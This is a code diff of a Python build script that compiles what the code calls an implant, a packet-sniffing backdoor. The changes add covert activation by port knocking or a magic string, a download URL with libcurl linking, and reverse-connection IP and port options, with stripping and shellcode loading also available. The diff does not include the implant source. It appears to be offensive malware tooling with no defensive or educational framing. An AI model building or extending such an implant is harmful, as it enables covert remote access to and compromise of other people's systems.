@@ -83,7 +83,7 @@ def get_arg_flags():
         addrs = ', '.join(addrs)
         arg_flags.append("-DCORRECT_IP_LIST={" + addrs + "}")
     if args.downloadURL:
-        arg_flags.append("-DDOWNLOAD_URL='\"" + args.atkD + "\"'")
+        arg_flags.append("-DDOWNLOAD_URL=\"" + args.downloadURL + "\"")
     if args.bang:
         arg_flags.append("-DBANG")
     if args.loadShellcode:
@@ -93,7 +93,10 @@ def get_arg_flags():
     if args.strip:
         arg_flags.append("-s")
     if args.key:
-        arg_flags.append("-DCDR_PORTS={" + args.key + "}")
+        if args.activate == "PORT_KNOCK_LIST":
+            arg_flags.append("-DCDR_PORTS={" + args.key + "}")
+        elif args.activate == "MAGIC_PORT_STRING":
+            arg_flags.append("-DMAGIC_STRING=\"" + args.key + "\"")
     if args.size:
         arg_flags.append("-DCDR_PORTS_SIZE=" + args.size)
     if args.activate:
@@ -111,7 +114,7 @@ def build():
     code_files = get_code_files()
     object_files = get_object_files(code_files)
     CFLAGS = ["-Wall"] + ["-I" + s for s in INCLUDE_DIR]
-    LDFLAGS = ["-lcrypto", "-lssl", "-lpcap"]
+    LDFLAGS = ["-lcrypto", "-lssl", "-lpcap", "-lcurl"]
     arg_flags = get_arg_flags()
 
     for i, file in enumerate(code_files):
@@ -134,7 +137,7 @@ def clean():
 
 parser = argparse.ArgumentParser(
     "python compiler.py",
-    usage="%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip]",
+    usage="%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act PORT_KNOCK_LIST] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip]",
 )
 
 parser.add_argument("-d", "--debug", action="store_true", help="compile with debugging")
@@ -181,7 +184,7 @@ parser.add_argument(
     "-intfc", "--interface", type=str, metavar="", help="listener interface"
 )
 parser.add_argument(
-    "-act", "--activate", type=str, metavar="", help="activation method"
+    "-act", "--activate", type=str, metavar="", choices=["MAGIC_PORT_STRING", "PORT_KNOCK_LIST"], help="activation method"
 )
 parser.add_argument("-key", "--key", type=str, metavar="", help="activation key")
 parser.add_argument(
@@ -309,45 +312,3 @@ if args.clean:
     clean()
 else:
     build()
-
-# implant_name = "sniffer.c"
-# ldflags = ["-lcrypto", "-lssl", "-lpcap"]
-# cflags = ["-Wall", "-I"+include_dir]
-# object_files = []
-# code_files = []
-
-# generated_source = implant_dir + implant_name
-
-# for filename in os.listdir(lib_dir):
-#     file_path = os.path.join(lib_dir, filename)
-#     if os.path.isfile(file_path):
-#         code_files.append(file_path)
-
-# for filename in os.listdir(lib_dir):
-#     file_path = os.path.join(build_dir, filename.replace(".c", ".o"))
-#     object_files.append(file_path)
-
-# for source_file in code_files:
-#     output_name = source_file.replace(lib_dir, build_dir)
-#     output_name = output_name.replace(".c", ".o")
-
-#     compile_cmd = ["gcc", "-c", source_file, "-o", output_name, "-I"+include_dir]
-#     result = subprocess.run(compile_cmd, capture_output=True, text=True)
-#     if result.returncode != 0:
-#         print(f"Error compiling {source_file}:")
-#         print(result.stderr)
-
-
-
-# compile_cmd = ["gcc", "-I"+include_dir, generated_source, "-o", implant_dir+args.outputName]
-# for object_file in object_files:
-#     compile_cmd.append(object_file)
-
-# for flag in ldflags:
-#     compile_cmd.append(flag)
-
-# print(f"[+] Running: {' '.join(compile_cmd)}")
-# result = subprocess.run(compile_cmd, capture_output=True, text=True)
-# if result.returncode != 0:
-#     print(f"Error compiling {source_file}:")
-#     print(result.stderr)
